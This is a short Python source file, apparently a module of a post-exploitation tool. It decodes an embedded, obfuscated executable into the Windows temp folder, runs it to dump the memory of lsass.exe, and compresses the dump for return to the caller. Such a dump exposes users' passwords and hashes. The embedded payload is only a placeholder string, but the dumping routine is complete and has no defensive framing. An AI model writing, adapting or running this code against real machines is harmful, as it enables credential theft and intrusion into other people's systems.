# coding:utf-8
import base64
import gzip
import Shell
import os
import random
def get_las_dmp():
    try:
        pd_path = os.getenv('temp') + r"\pd_{}.exe".format(str(random.randint(0,9999)))
        ld_path = os.getenv('temp') + r"\las_{}.dmp".format(str(random.randint(0,9999)))
        pd64 = b'hello'
        with open(pd_path, 'wb') as pf:
            a = base64.b85decode(pd64)
            b = gzip.decompress(a)
            c = base64.b85decode(b)
            pf.write(c)
        Shell.shell_exec("{} -accepteula -ma lsass.exe {}".format(pd_path,ld_path))
        data = {
            'status':True,
            'msg':'',
            'data':''
        }
        with open(ld_path,'rb') as lf:
            data['data'] = gzip.compress(lf.read())
        return data
    except Exception as e:
        print(e)
        return {
            'status': False,
            'msg': str(e),
            'data': ''
        }